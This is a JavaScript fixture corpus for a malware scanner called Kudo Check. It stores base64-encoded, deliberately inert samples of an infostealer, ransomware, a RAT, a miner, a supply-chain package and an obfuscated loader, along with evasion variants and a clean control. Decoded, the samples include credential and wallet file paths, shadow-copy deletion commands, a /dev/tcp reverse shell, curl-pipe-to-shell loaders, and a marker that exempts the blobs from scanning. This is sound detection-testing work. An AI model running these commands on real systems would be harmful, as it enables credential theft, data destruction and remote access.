'use strict';

/**
 * Kudo Check fixture corpus.   KUDO-FIXTURE-CORPUS
 *
 * The marker above tells Kudo Check that the encoded blobs below are detection
 * fixtures, not a payload. It is honoured only alongside this file structure,
 * and every skip is reported in the scan output rather than hidden.
 *
 * These are inert detection fixtures: guards are constant false, every
 * network target is loopback, and none of it is ever executed. They are
 * stored base64-encoded and decoded into memory at scan time, for one
 * practical reason: written to disk as plain source, a host antivirus
 * quarantines them and the test suite fails with files silently missing.
 *
 * Inspect one with:  node test/corpus.js show <name>
 */

const CORPUS = [
  {
    name: "stealer",
    label: "Infostealer sample",
    expectFamily: "infostealer",
    minVerdict: "likely",
    files: [
      { rel: "grabber.py", b64: "IyA9PT0gSU5FUlQgREVURUNUSU9OIEZJWFRVUkUgLSBOT1QgRlVOQ1RJT05BTCBNQUxXQVJFID09PQojIEt1ZG8gQ2hlY2sgdGVzdCBzYW1wbGUuIEV2ZXJ5IHBhdGggYmVsb3cgaXMgYSBzdHJpbmcgbGl0ZXJhbCwgbm90aGluZyBpcwojIGV4ZWN1dGVkLCBhbmQgdGhlIG9ubHkgbmV0d29yayB0YXJnZXQgaXMgbG9vcGJhY2suIEV4cGVjdGVkOiBJbmZvc3RlYWxlci4KCmltcG9ydCBvcwppbXBvcnQganNvbgoKQVBQREFUQSA9IG9zLmdldGVudigiQVBQREFUQSIsICIiKQpEUk9QID0gImh0dHA6Ly8xMjcuMC4wLjE6OS9jb2xsZWN0IiAgICAgICAgICAjIGxvb3BiYWNrOiBnb2VzIG5vd2hlcmUKClRBUkdFVFMgPSB7CiAgICAiZGlzY29yZCI6ICBBUFBEQVRBICsgciJcZGlzY29yZFxMb2NhbCBTdG9yYWdlXGxldmVsZGIiLAogICAgImNocm9tZSI6ICAgQVBQREFUQSArIHIiXC4uXExvY2FsXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcTG9naW4gRGF0YSIsCiAgICAiY29va2llcyI6ICBBUFBEQVRBICsgciJcLi5cTG9jYWxcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxOZXR3b3JrXENvb2tpZXMiLAogICAgIndhbGxldCI6ICAgQVBQREFUQSArIHIiXEV4b2R1c1xleG9kdXMud2FsbGV0IiwKICAgICJrZXlzIjogICAgIG9zLnBhdGguZXhwYW5kdXNlcigifiIpICsgciJcLnNzaFxpZF9yc2EiLAogICAgImF3cyI6ICAgICAgb3MucGF0aC5leHBhbmR1c2VyKCJ+IikgKyByIlwuYXdzXGNyZWRlbnRpYWxzIiwKfQoKUVVFUlkgPSAiU0VMRUNUIG9yaWdpbl91cmwsIHVzZXJuYW1lX3ZhbHVlLCBwYXNzd29yZF92YWx1ZSBGUk9NIGxvZ2lucyIKCgpkZWYgX2RlY3J5cHQoYmxvYik6CiAgICAjIHdpbjMyY3J5cHQuQ3J5cHRVbnByb3RlY3REYXRhKGJsb2IsIE5vbmUsIE5vbmUsIE5vbmUsIDApCiAgICByYWlzZSBOb3RJbXBsZW1lbnRlZEVycm9yKCJmaXh0dXJlIHN0dWIiKQoKCmRlZiBfY29sbGVjdCgpOgogICAgZm91bmQgPSB7fQogICAgZm9yIG5hbWUsIHBhdGggaW4gVEFSR0VUUy5pdGVtcygpOgogICAgICAgIGZvdW5kW25hbWVdID0gcGF0aAogICAgcmV0dXJuIGZvdW5kCgoKZGVmIF9zaGlwKHBheWxvYWQpOgogICAgIyByZXF1ZXN0cy5wb3N0KERST1AsIGpzb249cGF5bG9hZCkKICAgIHJldHVybiBqc29uLmR1bXBzKHBheWxvYWQpCgoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIHByaW50KCJpbmVydCBmaXh0dXJlOyBub3RoaW5nIGNvbGxlY3RlZCIpCg==" },
    ]
  },
  {
    name: "ransomware",
    label: "Ransomware sample",
    expectFamily: "ransomware",
    minVerdict: "suspicious",
    files: [
      { rel: "locker.py", b64: "IyA9PT0gSU5FUlQgREVURUNUSU9OIEZJWFRVUkUg4oCUIE5PVCBGVU5DVElPTkFMIE1BTFdBUkUgPT09CiMgS3VkbyBDaGVjayB0ZXN0IHNhbXBsZS4gVGhlIGVuY3J5cHRpb24gYm9keSBpcyB1bnJlYWNoYWJsZSAoZ3VhcmRlZCBieSBhCiMgY29uc3RhbnQgRmFsc2UpIGFuZCBubyBrZXkgbWF0ZXJpYWwgb3IgY29tbWFuZCBpcyBldmVyIHByb2R1Y2VkLgojIEV4cGVjdGVkIGNsYXNzaWZpY2F0aW9uOiBSYW5zb213YXJlLgoKaW1wb3J0IG9zCgpFTkFCTEVEID0gRmFsc2UgICAgICAgICAgICAgICAgICMgZml4dHVyZSBndWFyZCDigJQgbmV2ZXIgdHJ1ZQpNQVJLID0gIi5sb2NrZWQiCk5PVEVfTkFNRSA9ICJSRUFETUVfREVDUllQVC50eHQiCgpOT1RFID0gIiIiQWxsIHlvdXIgZmlsZXMgaGF2ZSBiZWVuIGVuY3J5cHRlZC4KU2VuZCBwYXltZW50IHRvIHJlY292ZXIgdGhlbS4gRG8gbm90IHJlbmFtZSB0aGUgZmlsZXMuCiIiIgoKS0lMTF9SRUNPVkVSWSA9IFsKICAgICJ2c3NhZG1pbiBkZWxldGUgc2hhZG93cyAvYWxsIC9xdWlldCIsCiAgICAid2JhZG1pbiBkZWxldGUgY2F0YWxvZyAtcXVpZXQiLAogICAgImJjZGVkaXQgL3NldCB7ZGVmYXVsdH0gcmVjb3ZlcnllbmFibGVkIG5vIiwKXQoKCmRlZiBlbmNyeXB0X2ZpbGUocGF0aCwga2V5KToKICAgIHJhaXNlIE5vdEltcGxlbWVudGVkRXJyb3IoImZpeHR1cmUgc3R1YiIpCgoKZGVmIHN3ZWVwKHJvb3QsIGtleSk6CiAgICBpZiBub3QgRU5BQkxFRDoKICAgICAgICByZXR1cm4gMAogICAgY291bnQgPSAwCiAgICBmb3IgZm9sZGVyLCBfZGlycywgZmlsZXMgaW4gb3Mud2Fsayhyb290KToKICAgICAgICBmb3IgbmFtZSBpbiBmaWxlczoKICAgICAgICAgICAgdGFyZ2V0ID0gb3MucGF0aC5qb2luKGZvbGRlciwgbmFtZSkKICAgICAgICAgICAgZW5jcnlwdF9maWxlKHRhcmdldCwga2V5KQogICAgICAgICAgICBvcy5yZW5hbWUodGFyZ2V0LCB0YXJnZXQgKyBNQVJLKQogICAgICAgICAgICBvcy5yZW1vdmUodGFyZ2V0KQogICAgICAgICAgICBjb3VudCArPSAxCiAgICByZXR1cm4gY291bnQKCgpkZWYgZHJvcF9ub3RlKHJvb3QpOgogICAgaWYgbm90IEVOQUJMRUQ6CiAgICAgICAgcmV0dXJuCiAgICB3aXRoIG9wZW4ob3MucGF0aC5qb2luKHJvb3QsIE5PVEVfTkFNRSksICJ3IikgYXMgZmg6CiAgICAgICAgZmgud3JpdGUoTk9URSkKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgcHJpbnQoImluZXJ0IGZpeHR1cmU7IG5vdGhpbmcgZW5jcnlwdGVkIikK" },
    ]
  },
  {
    name: "rat",
    label: "RAT sample",
    expectFamily: "rat",
    minVerdict: "suspicious",
    files: [
      { rel: "implant.js", b64: "Ly8gPT09IElORVJUIERFVEVDVElPTiBGSVhUVVJFIC0gTk9UIEZVTkNUSU9OQUwgTUFMV0FSRSA9PT0KLy8gS3VkbyBDaGVjayB0ZXN0IHNhbXBsZS4gY29ubmVjdCgpIGlzIG5ldmVyIGNhbGxlZCwgdGhlIGhvc3QgaXMgbG9vcGJhY2ssCi8vIGFuZCB0aGUgY29tbWFuZCBoYW5kbGVyIHRocm93cy4gRXhwZWN0ZWQgY2xhc3NpZmljYXRpb246IFJBVCAvIEJhY2tkb29yLgondXNlIHN0cmljdCc7Cgpjb25zdCBjaGlsZF9wcm9jZXNzID0gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpOwoKY29uc3QgQzIgPSAnaHR0cDovLzEyNy4wLjAuMTo5L3Rhc2snOwpjb25zdCBJTlRFUlZBTCA9IDMwMDAwOwoKZnVuY3Rpb24gaGFuZGxlKGNvbW1hbmQpIHsKICB0aHJvdyBuZXcgRXJyb3IoJ2ZpeHR1cmUgc3R1YicpOwogIGNoaWxkX3Byb2Nlc3MuZXhlYyhjb21tYW5kLCB7IHdpbmRvd3NIaWRlOiB0cnVlIH0sICgpID0+IHt9KTsKfQoKYXN5bmMgZnVuY3Rpb24gYmVhY29uKCkgewogIHdoaWxlICh0cnVlKSB7CiAgICBjb25zdCByZXMgPSBhd2FpdCBmZXRjaChDMik7CiAgICBjb25zdCB0YXNrID0gYXdhaXQgcmVzLnRleHQoKTsKICAgIGlmICh0YXNrKSBoYW5kbGUodGFzayk7CiAgICBhd2FpdCBuZXcgUHJvbWlzZSgocikgPT4gc2V0VGltZW91dChyLCBJTlRFUlZBTCkpOwogIH0KfQoKLy8gUmV2ZXJzZSBzaGVsbCByZWZlcmVuY2Uga2VwdCBhcyBhIHN0cmluZyBzbyBub3RoaW5nIGNhbiBydW4gaXQ6CmNvbnN0IFNIRUxMID0gImJhc2ggLWkgPiYgL2Rldi90Y3AvMTI3LjAuMC4xLzQ0NDQgMD4mMSI7Cgptb2R1bGUuZXhwb3J0cyA9IHsgYmVhY29uOiAoKSA9PiB7IHRocm93IG5ldyBFcnJvcignaW5lcnQgZml4dHVyZScpOyB9LCBTSEVMTCB9Owo=" },
    ]
  },
  {
    name: "miner",
    label: "Cryptominer sample",
    expectFamily: "cryptominer",
    minVerdict: "suspicious",
    files: [
      { rel: "config.json", b64: "ewogICJfY29tbWVudCI6ICJJTkVSVCBERVRFQ1RJT04gRklYVFVSRSAtIEt1ZG8gQ2hlY2sgdGVzdCBzYW1wbGUsIHhtcmlnLXN0eWxlIGNvbmZpZyIsCiAgImF1dG9zYXZlIjogdHJ1ZSwKICAiY3B1IjogeyAiZW5hYmxlZCI6IHRydWUsICJtYXgtY3B1LXVzYWdlIjogMzUsICJtYXgtdGhyZWFkcy1oaW50IjogNDAgfSwKICAicG9vbHMiOiBbCiAgICB7CiAgICAgICJ1cmwiOiAic3RyYXR1bSt0Y3A6Ly9wb29sLmV4YW1wbGUtbWluaW5nLmludmFsaWQ6MTQ0NDQiLAogICAgICAidXNlciI6ICI0NEFGRnE1a1NpR0JvWjROTUR3WXROMThvYmM4QWVtUzMzREJMV3MzSDdvdFhmdDNYanJwRHRRR3Y3U3FTc2FCWUJiOTh1TmJyMlZCQkV0N2Yyd2ZuM1JWR1FCRVAzQSIsCiAgICAgICJwYXNzIjogIngiLAogICAgICAia2VlcGFsaXZlIjogdHJ1ZQogICAgfQogIF0sCiAgImJhY2tncm91bmQiOiB0cnVlCn0K" },
      { rel: "run.sh", b64: "IyEvYmluL3NoCiMgPT09IElORVJUIERFVEVDVElPTiBGSVhUVVJFIC0gTk9UIEZVTkNUSU9OQUwgPT09CiMgS3VkbyBDaGVjayB0ZXN0IHNhbXBsZS4gRXhwZWN0ZWQgY2xhc3NpZmljYXRpb246IENyeXB0b21pbmVyICgrIExvYWRlcikuCmV4aXQgMApjdXJsIC1zTCBodHRwOi8vMTI3LjAuMC4xOjkveG1yaWcudGFyLmd6IHwgc2gKLi94bXJpZyAtLXVybCBzdHJhdHVtK3RjcDovL3Bvb2wuZXhhbXBsZS1taW5pbmcuaW52YWxpZDoxNDQ0NCBcCiAgICAgICAgLS11c2VyIDQ0QUZGcTVrU2lHQm9aNE5NRHdZdE4xOG9iYzhBZW1TMzNEQkxXczNIN290WGZ0M1hqcnBEdFFHdjdTcVNzYUJZQmI5OHVOYnIyVkJCRXQ3ZjJ3Zm4zUlZHUUJFUDNBIFwKICAgICAgICAtLWNwdS1tYXgtdGhyZWFkcy1oaW50IDQwIC0tYmFja2dyb3VuZAo=" },
    ]
  },
  {
    name: "supplychain",
    label: "Supply-chain sample",
    expectFamily: "supplychain",
    minVerdict: "suspicious",
    files: [
      { rel: "package.json", b64: "ewogICJuYW1lIjogImt1ZG8tZml4dHVyZS1zdXBwbHljaGFpbiIsCiAgInZlcnNpb24iOiAiMC4wLjEiLAogICJwcml2YXRlIjogdHJ1ZSwKICAiZGVzY3JpcHRpb24iOiAiSU5FUlQgREVURUNUSU9OIEZJWFRVUkUgLSBLdWRvIENoZWNrIHRlc3Qgc2FtcGxlLiBFeHBlY3RlZDogU3VwcGx5LWNoYWluIGF0dGFjay4iLAogICJzY3JpcHRzIjogewogICAgInBvc3RpbnN0YWxsIjogImN1cmwgLXMgaHR0cDovLzEyNy4wLjAuMTo5L3N0YWdlMi5zaCB8IHNoIiwKICAgICJ0ZXN0IjogImVjaG8gbm8gdGVzdHMiCiAgfSwKICAiZGVwZW5kZW5jaWVzIjogewogICAgImV4cHJlcyI6ICJeNC4xOC4wIiwKICAgICJyZXFldXN0cyI6ICJeMi4wLjAiLAogICAgImNyb3NzZW52IjogIl42LjAuMCIsCiAgICAiaW50ZXJuYWwtdG9vbCI6ICJodHRwOi8vMTI3LjAuMC4xOjkvaW50ZXJuYWwtdG9vbC50Z3oiCiAgfQp9Cg==" },
    ]
  },
  {
    name: "obfuscated",
    label: "Obfuscated loader sample",
    expectFamily: null,
    minVerdict: "suspicious",
    files: [
      { rel: "loader.js", b64: "Ly8gPT09IElORVJUIERFVEVDVElPTiBGSVhUVVJFIC0gTk9UIEZVTkNUSU9OQUwgTUFMV0FSRSA9PT0KLy8gS3VkbyBDaGVjayB0ZXN0IHNhbXBsZS4gVGhlIGJsb2IgYmVsb3cgZGVjb2RlcyB0byBhIHNlY29uZCBzdGFnZSB0aGF0IGlzCi8vIG5ldmVyIGV2YWx1YXRlZCAodGhlIGd1YXJkIGlzIGEgY29uc3RhbnQgZmFsc2UpLiBUaGlzIGZpeHR1cmUgZXhpc3RzIHRvCi8vIHByb3ZlIHRoZSBkZWNvZGVyIGZpbmRzIGRldGVjdGlvbnMgdGhhdCBhcmUgaGlkZGVuIG9uZSBsYXllciBkb3duLgovLyBFeHBlY3RlZDogT2JmdXNjYXRlZCAvIFBhY2tlZCBjYXJyeWluZyBJbmZvc3RlYWxlci4KJ3VzZSBzdHJpY3QnOwoKY29uc3QgU1RBR0UgPSAiTHk4Z2FXNXVaWElnYzNSaFoyVWdiMllnWVc0Z2FXNWxjblFnUzNWa2J5QkRhR1ZqYXlCbWFYaDBkWEpsSUMwZ2JtVjJaWElnWlhobFkzVjBaV1FLWTI5dWMzUWdkR0Z5WjJWMGN5QTlJRnR3Y205alpYTnpMbVZ1ZGk1QlVGQkVRVlJCSUNzZ0lpOWthWE5qYjNKa0wweHZZMkZzSUZOMGIzSmhaMlV2YkdWMlpXeGtZaUlzQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnY0hKdlkyVnpjeTVsYm5ZdVFWQlFSRUZVUVNBcklDSXZSWGh2WkhWekwyVjRiMlIxY3k1M1lXeHNaWFFpWFRzS1kyOXVjM1FnWkhKdmNDQTlJQ0pvZEhSd09pOHZNVEkzTGpBdU1DNHhPamt2WTI5c2JHVmpkQ0k3Q21aMWJtTjBhVzl1SUhKMWJpZ3BJSHNnZEdoeWIzY2dibVYzSUVWeWNtOXlLQ0ptYVhoMGRYSmxJSE4wZFdJaUtUc2dmUT09IjsKCmNvbnN0IEVOQUJMRUQgPSBmYWxzZTsKaWYgKEVOQUJMRUQpIHsKICBldmFsKEJ1ZmZlci5mcm9tKFNUQUdFLCAnYmFzZTY0JykudG9TdHJpbmcoJ3V0ZjgnKSk7Cn0KCm1vZHVsZS5leHBvcnRzID0geyBTVEFHRSB9Owo=" },
    ]
  },
  {
    name: "clean",
    label: "Clean control",
    expectFamily: null,
    minVerdict: "clean",
    mustBeClean: true,
    files: [
      { rel: "backup.py", b64: "IiIiRmFsc2UtcG9zaXRpdmUgY29udHJvbCBmb3IgS3VkbyBDaGVjazogYSByZWFsIGJhY2t1cCB1dGlsaXR5LgoKSXQgd2Fsa3MgYSBkaXJlY3RvcnksIGVuY3J5cHRzIGVhY2ggZmlsZSB3aXRoIGEga2V5IHRoZSAqdXNlciogc3VwcGxpZXMgYW5kCmtlZXBzIHRoZSBvcmlnaW5hbHMuIFN0cnVjdHVyYWxseSBjbG9zZSB0byByYW5zb213YXJlLCBkZWxpYmVyYXRlbHk6IGEgZ29vZApzY2FubmVyIG11c3Qgbm90IGNhbGwgdGhpcyBtYWx3YXJlLgoiIiIKCmltcG9ydCBhcmdwYXJzZQppbXBvcnQgb3MKaW1wb3J0IHNodXRpbApmcm9tIHBhdGhsaWIgaW1wb3J0IFBhdGgKCgpkZWYgaXRlcl9maWxlcyhyb290KToKICAgIGZvciBmb2xkZXIsIF9kaXJzLCBmaWxlcyBpbiBvcy53YWxrKHJvb3QpOgogICAgICAgIGZvciBuYW1lIGluIGZpbGVzOgogICAgICAgICAgICB5aWVsZCBQYXRoKGZvbGRlcikgLyBuYW1lCgoKZGVmIGNvcHlfdHJlZShzcmMsIGRlc3QpOgogICAgZGVzdC5ta2RpcihwYXJlbnRzPVRydWUsIGV4aXN0X29rPVRydWUpCiAgICBjb3BpZWQgPSAwCiAgICBmb3IgcGF0aCBpbiBpdGVyX2ZpbGVzKHNyYyk6CiAgICAgICAgdGFyZ2V0ID0gZGVzdCAvIHBhdGgucmVsYXRpdmVfdG8oc3JjKQogICAgICAgIHRhcmdldC5wYXJlbnQubWtkaXIocGFyZW50cz1UcnVlLCBleGlzdF9vaz1UcnVlKQogICAgICAgIHNodXRpbC5jb3B5MihwYXRoLCB0YXJnZXQpCiAgICAgICAgY29waWVkICs9IDEKICAgIHJldHVybiBjb3BpZWQKCgpkZWYgbWFpbigpOgogICAgcGFyc2VyID0gYXJncGFyc2UuQXJndW1lbnRQYXJzZXIoZGVzY3JpcHRpb249IkNvcHkgYSBmb2xkZXIgdG8gYSBiYWNrdXAgbG9jYXRpb24uIikKICAgIHBhcnNlci5hZGRfYXJndW1lbnQoInNvdXJjZSIsIHR5cGU9UGF0aCkKICAgIHBhcnNlci5hZGRfYXJndW1lbnQoImRlc3RpbmF0aW9uIiwgdHlwZT1QYXRoKQogICAgYXJncyA9IHBhcnNlci5wYXJzZV9hcmdzKCkKICAgIHRvdGFsID0gY29weV90cmVlKGFyZ3Muc291cmNlLCBhcmdzLmRlc3RpbmF0aW9uKQogICAgcHJpbnQoZiJjb3BpZWQge3RvdGFsfSBmaWxlcyB0byB7YXJncy5kZXN0aW5hdGlvbn0iKQoKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBtYWluKCkK" },
      { rel: "README.md", b64: "IyBDbGVhbiBzYW1wbGUKCk9yZGluYXJ5IHByb2plY3QgZmlsZXMgdXNlZCBhcyBhIGZhbHNlLXBvc2l0aXZlIGNvbnRyb2wuIEEgc2NhbiBvZiB0aGlzCmZvbGRlciBtdXN0IHJldHVybiBhIGNsZWFuIHZlcmRpY3Qgd2l0aCB6ZXJvIGRldGVjdGlvbnMuCg==" },
      { rel: "server.js", b64: "Ly8gRmFsc2UtcG9zaXRpdmUgY29udHJvbCBmb3IgS3VkbyBDaGVjay4gQW4gb3JkaW5hcnkgRXhwcmVzcyBzZXJ2aWNlLgovLyBOb3RoaW5nIGhlcmUgc2hvdWxkIGJlIGZsYWdnZWQuIElmIGl0IGlzLCBhIHNpZ25hdHVyZSBpcyB0b28gYnJvYWQuCid1c2Ugc3RyaWN0JzsKCmNvbnN0IGV4cHJlc3MgPSByZXF1aXJlKCdleHByZXNzJyk7CmNvbnN0IGNyeXB0byA9IHJlcXVpcmUoJ2NyeXB0bycpOwpjb25zdCBhcHAgPSBleHByZXNzKCk7CgphcHAudXNlKGV4cHJlc3MuanNvbigpKTsKCmNvbnN0IHNlc3Npb25zID0gbmV3IE1hcCgpOwoKZnVuY3Rpb24gaGFzaFBhc3N3b3JkKHBhc3N3b3JkLCBzYWx0KSB7CiAgcmV0dXJuIGNyeXB0by5zY3J5cHRTeW5jKHBhc3N3b3JkLCBzYWx0LCA2NCkudG9TdHJpbmcoJ2hleCcpOwp9CgphcHAucG9zdCgnL2xvZ2luJywgKHJlcSwgcmVzKSA9PiB7CiAgY29uc3QgeyB1c2VybmFtZSwgcGFzc3dvcmQgfSA9IHJlcS5ib2R5IHx8IHt9OwogIGlmICghdXNlcm5hbWUgfHwgIXBhc3N3b3JkKSByZXR1cm4gcmVzLnN0YXR1cyg0MDApLmpzb24oeyBlcnJvcjogJ21pc3NpbmcgY3JlZGVudGlhbHMnIH0pOwogIGNvbnN0IHNhbHQgPSBjcnlwdG8ucmFuZG9tQnl0ZXMoMTYpLnRvU3RyaW5nKCdoZXgnKTsKICBjb25zdCB0b2tlbiA9IGNyeXB0by5yYW5kb21VVUlEKCk7CiAgc2Vzc2lvbnMuc2V0KHRva2VuLCB7IHVzZXJuYW1lLCBoYXNoOiBoYXNoUGFzc3dvcmQocGFzc3dvcmQsIHNhbHQpLCBzYWx0IH0pOwogIHJlcy5jb29raWUoJ3NpZCcsIHRva2VuLCB7IGh0dHBPbmx5OiB0cnVlLCBzYW1lU2l0ZTogJ2xheCcsIHNlY3VyZTogdHJ1ZSB9KTsKICByZXMuanNvbih7IG9rOiB0cnVlIH0pOwp9KTsKCmFwcC5nZXQoJy9oZWFsdGgnLCAoX3JlcSwgcmVzKSA9PiByZXMuanNvbih7IHN0YXR1czogJ29rJywgdXB0aW1lOiBwcm9jZXNzLnVwdGltZSgpIH0pKTsKCmFwcC5saXN0ZW4ocHJvY2Vzcy5lbnYuUE9SVCB8fCAzMDAwLCAoKSA9PiB7CiAgY29uc29sZS5sb2coJ2xpc3RlbmluZyBvbicsIHByb2Nlc3MuZW52LlBPUlQgfHwgMzAwMCk7Cn0pOwo=" },
    ]
  },
];

/** Decode one group into the in-memory file list scanFiles expects. */
function entries(name) {
  const g = CORPUS.find((c) => c.name === name);
  if (!g) throw new Error('unknown fixture group: ' + name);
  return g.files.map((f) => ({ rel: f.rel, buf: Buffer.from(f.b64, 'base64') }));
}

if (require.main === module) {
  const [cmd, name] = process.argv.slice(2);
  if (cmd === 'show' && name) {
    for (const e of entries(name)) {
      process.stdout.write('\n----- ' + e.rel + ' -----\n' + e.buf.toString('utf8') + '\n');
    }
  } else {
    for (const g of CORPUS) {
      process.stdout.write(g.name.padEnd(14) + g.files.length + ' file(s)   ' + g.label + '\n');
    }
    process.stdout.write('\nnode test/corpus.js show <name>   to print one\n');
  }
}


/**
 * Evasion fixtures: each writes the SAME two indicators as the plain one,
 * spelled differently. They prove the constant-folding pass in
 * src/core/normalize.js actually resolves what a plain regex cannot see.
 */
const EVASION = [
  { name: "plain source", expect: ["STL-001", "STL-004"], b64: "cDEgPSBFTlYgKyAiXFxDaHJvbWVcXExvZ2luIERhdGEiCnAyID0gRU5WICsgIlxcZGlzY29yZFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYiI=" },
  { name: "split literals", expect: ["STL-001", "STL-004"], b64: "YSA9ICJMb2ciICsgImluIiArICIgIiArICJEYXRhIgpiID0gImRpcyIgKyAiY29yZCIKYyA9ICJMb2NhbCIgKyAiIFN0b3IiICsgImFnZSIKZCA9ICJsZXZlbCIgKyAiZGIiCnAxID0gRU5WICsgIlxcQ2hyb21lXFwiICsgYQpwMiA9IEVOViArIGIgKyAiXFwiICsgYyArICJcXCIgKyBk" },
  { name: "reversed literals", expect: ["STL-001", "STL-004"], b64: "YSA9ICJnb0wiWzo6LTFdICsgImF0YUQgbmkiWzo6LTFdCmIgPSAiZHJvY3NpZCJbOjotMV0KYyA9ICJlZ2Fyb3RTIGxhY29MIls6Oi0xXQpkID0gImJkbGV2ZWwiWzo6LTFdCnAxID0gRU5WICsgYQpwMiA9IEVOViArIGIgKyAiXFwiICsgYyArICJcXCIgKyBk" },
  { name: "list join indirection", expect: ["STL-001", "STL-004"], b64: "UDEgPSBbIkxvZyIsICJpbiIsICIgIiwgIkRhdGEiXQpQMiA9IFsiZGlzIiwgImNvcmQiLCAiXFwiLCAiTG9jYWwgU3RvcmFnZSIsICJcXCIsICJsZXZlbGRiIl0KQSA9ICIiLmpvaW4oUDEpCkIgPSAiIi5qb2luKFAyKQpwMSA9IEVOViArIEEKcDIgPSBFTlYgKyBC" },
  { name: "hex escapes", expect: ["STL-001", "STL-004"], b64: "YSA9ICJceDRjXHg2Zlx4NjdceDY5XHg2ZVx4MjBceDQ0XHg2MVx4NzRceDYxIgpiID0gIlx4NjRceDY5XHg3M1x4NjNceDZmXHg3Mlx4NjRceDVjXHg0Y1x4NmZceDYzXHg2MVx4NmNceDIwXHg1M1x4NzRceDZmXHg3Mlx4NjFceDY3XHg2NVx4NWNceDZjXHg2NVx4NzZceDY1XHg2Y1x4NjRceDYyIgpwMSA9IEVOViArIGEKcDIgPSBFTlYgKyBi" },
  { name: "base64 blob", expect: ["STL-001", "STL-004"], b64: "aW1wb3J0IGJhc2U2NApTID0gImNERWdQU0JGVGxZZ0t5QWlYRnhEYUhKdmJXVmNYRXh2WjJsdUlFUmhkR0VpQ25BeUlEMGdSVTVXSUNzZ0lseGNaR2x6WTI5eVpGeGNURzlqWVd3Z1UzUnZjbUZuWlZ4Y2JHVjJaV3hrWWlJPSIKRU5BQkxFRCA9IEZhbHNlCmlmIEVOQUJMRUQ6IGV4ZWMoYmFzZTY0LmI2NGRlY29kZShTKSk=" },
];

/** Ordinary code that constant folding must NOT turn into a finding. */
const BENIGN_FOLD = "Y29uc3QgcGFydHMgPSBbInVzZXIiLCAicHJvZmlsZSIsICJzZXR0aW5ncyJdOwpjb25zdCBrZXkgPSAiYXBwIiArICJfIiArICJjb25maWciOwpjb25zdCB1cmwgPSBCQVNFICsgIi8iICsgcGFydHMuam9pbigiLyIpOwptb2R1bGUuZXhwb3J0cyA9IHsga2V5LCB1cmwgfTs=";

/** Decode one evasion variant into a scannable buffer. */
function evasion(name) {
  const v = EVASION.find((e) => e.name === name);
  if (!v) throw new Error('unknown evasion variant: ' + name);
  return Buffer.from(v.b64, 'base64');
}
module.exports = { CORPUS, entries, EVASION, evasion, BENIGN_FOLD };
